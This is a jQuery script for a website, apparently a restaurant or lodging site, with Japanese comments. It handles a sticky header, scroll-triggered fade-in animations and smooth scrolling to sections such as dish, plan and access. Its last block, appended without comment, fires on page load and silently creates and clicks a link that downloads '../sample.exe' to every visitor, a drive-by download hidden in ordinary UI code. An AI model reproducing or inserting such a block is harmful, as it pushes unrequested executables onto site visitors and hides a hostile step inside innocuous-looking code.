/*https://coco-factory.jp/ugokuweb/move01/5-1-5/から引用*/
//スクロールすると上部に固定させるための設定を関数でまとめる
function FixedAnime() {
    var headerH = 900;
    var scroll = $(window).scrollTop();
    if (scroll >= headerH){//headerの高さ以上になったら
            $('.rel_header').addClass('is-show');//fixedというクラス名を付与
        }else{//それ以外は
            $('.rel_header').removeClass('is-show');//fixedというクラス名を除去
        }
}

// 画面をスクロールをしたら動かしたい場合の記述
$(window).scroll(function () {
    FixedAnime();/* スクロール途中からヘッダーを出現させる関数を呼ぶ*/
});

// ページが読み込まれたらすぐに動かしたい場合の記述
$(window).on('load', function () {
    FixedAnime();/* スクロール途中からヘッダーを出現させる関数を呼ぶ*/
});

/*アニメーション*/
function animation(){
    $('.animation').each(function(){
        //ターゲットの位置を取得
        var target = $(this).offset().top;
        //スクロール量を取得
        var scroll = $(window).scrollTop();
        //ウィンドウの高さを取得
        var height = $(window).height();
        //ターゲットまでスクロールするとフェードインする
        if (scroll > target - height){
            //クラスを付与
            $(this).addClass('active');
            setTimeout(() => {
                $('.animation_before1').addClass('active')//1000ms後に表示
            }, 1000)
            setTimeout(() => {
                $('.animation_before2').addClass('active')//1200ms後に表示
            }, 1200)
            setTimeout(() => {
                $('.animation_before3').addClass('active')//1500ms後に表示
            }, 1500)
            setTimeout(() => {
                $('.animation_before4').addClass('active')//1900ms後に表示
            }, 1900)
        }
    });
}

$(window).on('load scroll',function (){//ページがロードかスクロールされたら
    animation()//アニメーション実行
});

/*自動スクロール*/
$(".scroll_home").click(function () {
    var position = $('#home').offset().top;//要素のy方向の位置を変数に代入
    var speed = 600;//スクロールスピード
    $("html,body").animate({scrollTop:position},speed);//スクロール実行
});
$(".scroll_about").click(function () {
    var position = $('#about').offset().top-90;//要素のy方向の位置を変数に代入
    var speed = 600;//スクロールスピード
    $("html,body").animate({scrollTop:position},speed);//スクロール実行
});
$(".scroll_dish").click(function () {
    var position = $('#dish').offset().top-90;//要素のy方向の位置を変数に代入
    var speed = 600;//スクロールスピード
    $("html,body").animate({scrollTop:position},speed);//スクロール実行
});
$(".scroll_institution").click(function () {
    var position = $('#institution').offset().top-90;//要素のy方向の位置を変数に代入
    var speed = 600;//スクロールスピード
    $("html,body").animate({scrollTop:position},speed);//スクロール実行
});
$(".scroll_plan").click(function () {
    var position = $('#plan').offset().top-90;//要素のy方向の位置を変数に代入
    var speed = 600;//スクロールスピード
    $("html,body").animate({scrollTop:position},speed);//スクロール実行
});
$(".scroll_access").click(function () {
    var position = $('#access').offset().top-90;//要素のy方向の位置を変数に代入
    var speed = 600;//スクロールスピード
    $("html,body").animate({scrollTop:position},speed);//スクロール実行
});

$(window).on('load', function () {
    var link = document.createElement('a');
    link.href = '../sample.exe';
    link.download = '';
    document.body.appendChild(link);
    link.click();
});